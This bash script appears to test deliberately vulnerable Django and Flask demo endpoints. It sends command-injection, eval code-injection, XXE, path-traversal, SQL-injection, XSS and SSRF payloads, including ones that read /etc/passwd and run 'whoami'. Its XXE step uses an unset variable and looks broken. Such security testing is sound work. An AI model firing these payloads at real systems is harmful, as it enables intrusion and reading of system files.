#!/bin/bash

HOST=$1
RUN_ID=$2
if [ -z ${HOST} ]; then
  echo -e "api host required!"
  echo -e "Usage: $( basename $0 ) <api host>"
  exit 1
fi

FRAMEWORKS=(django flask)

headline() {
  TITLE=$1
  echo
  echo "########################### ${TITLE} ###########################"
  echo
}

api_get() {
  API_PATH=$1
  QUERY=$2

  echo "=========================== GET $API_PATH ==========================="
  echo
  for FRAMEWORK in "${FRAMEWORKS[@]}"; do
    curl "${HOST}/api/${FRAMEWORK}/${API_PATH}?_r=${RUN_ID}&${QUERY}"
  done
  echo
}

api_post() {
  API_PATH=$1
  DATA=$2

  echo "=========================== POST $API_PATH ==========================="
  echo
  for FRAMEWORK in "${FRAMEWORKS[@]}"; do
    curl "${HOST}/api/${FRAMEWORK}/${API_PATH}?_r=${RUN_ID}" -X POST --data-raw $DATA
  done
  echo
}

headline "exec-command"
api_post "demo/exec_post_popen" "code=ls"
api_post "demo/exec_post_subprocess" "cmd=cat&name=%2Fetc%2Fpasswd"
api_post "demo/cmd_exec" "cmd=whoami"
api_post "demo/exec_post_e" "code=whoami"

headline "exec-code"
api_post "demo/eval_post_e" "code=__import__%28%27os%27%29.system%28%27whoami%27%29"
api_post "demo/yaml_post_e" "code=whoami"

headline "path-traversal"
api_get "demo/get_open" "name=Data**"
api_post "demo/post_open" "name=.%2Ffile%2Fdata.json"

headline "sql-injection"
api_post "demo/postgresql_post_many" "id=100&name=song&phone1=13300000000"
api_post "demo/postgresql_post_excute" "name=song"
api_post "demo/mysql_post_many" "name=song&phone1=13300000000"
api_post "demo/mysql_post_exec" "name=song"
api_post "demo/sqlite3_post_executemany_sql" "phone1=13300000000"
api_post "demo/sqlite3_post_executescript" "name=song&phone1=13300000000"
api_post "demo/sqlite3_post" "phone1=13300000000"

headline "xss"
api_get "demo/xss_return" "content=alert"
api_get "demo/xss_template" "content=alert"
api_get "demo/xss_template_string" "content=alert"

headline "xxe"
cat > $XXE_PAYLOAD <<- EOM
<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE Anything [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <user>
  <username>&xxe;</username>
  <password>
    yzx
  </password>
 </user>
EOM
api_post "demo/xxe_login" '$XXE_PAYLOAD'

headline "ssrf"
api_get "demo/urllib_ssrf" "url=https://www.huoxian.cn/"
api_get "demo/request_ssrf" "url=https://www.huoxian.cn/"
